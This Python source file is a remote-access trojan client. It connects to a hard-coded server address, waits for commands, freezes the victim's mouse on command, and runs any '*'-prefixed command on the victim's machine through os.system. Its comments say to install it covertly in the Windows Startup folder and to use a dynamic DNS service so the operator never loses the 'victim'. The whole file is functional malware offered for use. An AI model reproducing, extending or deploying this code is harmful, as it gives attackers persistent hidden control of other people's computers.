import socket
from threading import Thread
from mouse import move,get_position
from time import sleep
from os import system

## You should make a installer and place this Client.exe to the Client's Windows Startup Folder ( Automatically. It's possible when making the Installer ), so this trojan will starts every time user Starts it's Windows.
class Main():
    def __init__(self):
        self.tcp=socket.socket()
        self.tcp.connect(('192.168.15.9',2330)) # (The Server's Ip, The Server's Port) // You should use something like NO-IP, so u'll never lose your victim.
        Thread(target=self.get_response).start() # Thread because we don't want to get stuck in the loop
    def get_response(self):
        try:
            while True:
                sleep(1) # The time for verifying if is there a new response.
                data = self.tcp.recv(1024).decode()
                if("freeze_mouse" in data): ## Just a Function that i made for freezing the victim's mouse
                    self.xPos = get_position()[0]
                    self.yPos = get_position()[1]
                    self.isFrozen = True
                    Thread(target=self.freeze_mouse).start() # Again, we don't want to get stuck in the loop
                if("unfreeze_mouse" in data): ## Just a Function that i made for freezing the victim's mouse
                    self.isFrozen = False
                if("*" in data):
                    data = data[1:]
                    system(data) ## At the moment, i think it's the powerfull tool for using. 
                    print(data)
                print(data) # Just printing the Server's Command ( Developing Mode..)
        except Exception as E: # If there's any error, we'r just sending it to Server's side.
            __temp = str(E)
            __temp = "*" + __temp
            __temp = __temp.encode()
            self.tcp.sendall(__temp)
            print(E)
    def freeze_mouse(self):
        while(self.isFrozen == True):
            print("loop")
            move(self.xPos,self.yPos)

            
Main()